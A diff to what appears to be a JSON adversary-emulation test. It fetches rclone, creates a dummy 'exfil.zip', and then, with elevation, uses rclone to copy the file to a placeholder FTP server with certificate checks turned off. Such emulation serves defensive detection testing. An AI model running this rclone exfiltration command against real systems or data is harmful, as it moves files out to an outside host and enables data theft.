@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655",
+      "id": "a08d924c-bc75-44b8-ab8c-d88e554fce6b",
       "type": "execute-command",
       "data": {
         "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n\u0026$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n\u0026$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
@@ -16,112 +16,112 @@
       "elevation_required": true
     },
     {
-      "id": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
+      "id": "111ae37b-6819-43b2-a9f4-54352448262e",
       "name": "Check dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c",
+      "id": "d446c5e4-9c32-4aaf-90fe-fad9363060fe",
       "name": "Resolve dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
       "data": {
-        "command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760\n",
-        "command_type": ""
+        "command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "febb42b6-3549-4903-89d0-80e78b50361a",
+      "id": "b0557f6a-5f8e-4f75-82f0-42ece1724ab4",
       "name": "Re-check dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "9b36c640-c0e2-49c8-9a69-6587708e8391",
+      "id": "aed1af18-60f4-4bb1-9911-f991f36663bd",
       "name": "Check dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "41d2e9bb-219f-4fea-883c-9a86a5f647a1",
+      "id": "70d6e74c-6f86-4612-87c1-0bcce22f63cf",
       "name": "Resolve dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
       "data": {
-        "command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\\n",
-        "command_type": ""
+        "command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\",
+        "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b",
+      "id": "3fffb2f8-e1a0-43ee-b674-2b2a789f47d7",
       "name": "Re-check dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
+      "s": "111ae37b-6819-43b2-a9f4-54352448262e",
       "p": "on-success",
-      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
+      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
     },
     {
-      "s": "a0199bef-1c04-4aea-85ea-61d4cb105a22",
+      "s": "111ae37b-6819-43b2-a9f4-54352448262e",
       "p": "on-failure",
-      "o": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c"
+      "o": "d446c5e4-9c32-4aaf-90fe-fad9363060fe"
     },
     {
-      "s": "c9d925fd-be35-4d21-b4eb-3bb2aa0ac57c",
+      "s": "d446c5e4-9c32-4aaf-90fe-fad9363060fe",
       "p": "on-success",
-      "o": "febb42b6-3549-4903-89d0-80e78b50361a"
+      "o": "b0557f6a-5f8e-4f75-82f0-42ece1724ab4"
     },
     {
-      "s": "febb42b6-3549-4903-89d0-80e78b50361a",
+      "s": "b0557f6a-5f8e-4f75-82f0-42ece1724ab4",
       "p": "on-failure",
-      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
+      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
     },
     {
-      "s": "9b36c640-c0e2-49c8-9a69-6587708e8391",
+      "s": "aed1af18-60f4-4bb1-9911-f991f36663bd",
       "p": "on-success",
-      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
+      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
     },
     {
-      "s": "9b36c640-c0e2-49c8-9a69-6587708e8391",
+      "s": "aed1af18-60f4-4bb1-9911-f991f36663bd",
       "p": "on-failure",
-      "o": "41d2e9bb-219f-4fea-883c-9a86a5f647a1"
+      "o": "70d6e74c-6f86-4612-87c1-0bcce22f63cf"
     },
     {
-      "s": "41d2e9bb-219f-4fea-883c-9a86a5f647a1",
+      "s": "70d6e74c-6f86-4612-87c1-0bcce22f63cf",
       "p": "on-success",
-      "o": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b"
+      "o": "3fffb2f8-e1a0-43ee-b674-2b2a789f47d7"
     },
     {
-      "s": "c89187c1-ecb7-4258-9c8d-32ac73e9f93b",
+      "s": "3fffb2f8-e1a0-43ee-b674-2b2a789f47d7",
       "p": "on-failure",
-      "o": "dfa3d6c1-e72b-4872-a0c2-49920ccf1655"
+      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
     }
   ],
   "tags": [
